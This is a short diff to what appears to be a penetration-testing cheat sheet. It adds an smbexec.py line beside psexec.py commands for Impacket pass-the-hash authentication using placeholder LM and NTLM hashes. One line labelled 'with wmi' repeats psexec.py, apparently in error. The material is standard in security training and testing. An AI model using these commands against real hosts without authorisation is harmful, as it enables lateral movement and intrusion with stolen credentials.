@@ -75,5 +75,5 @@ Or Use hash&#x20;
 psexec.py <user>@<ip>--hashes [LM-HASH]:[NTLM-HASH]
 # with wmi
 psexec.py <user>@<ip> --hashes [LM-HASH]:[NTLM-HASH]
-
+smbexec.py <user>@<ip> --hashes [LM-HASH]:[NTLM-HASH]
 ```
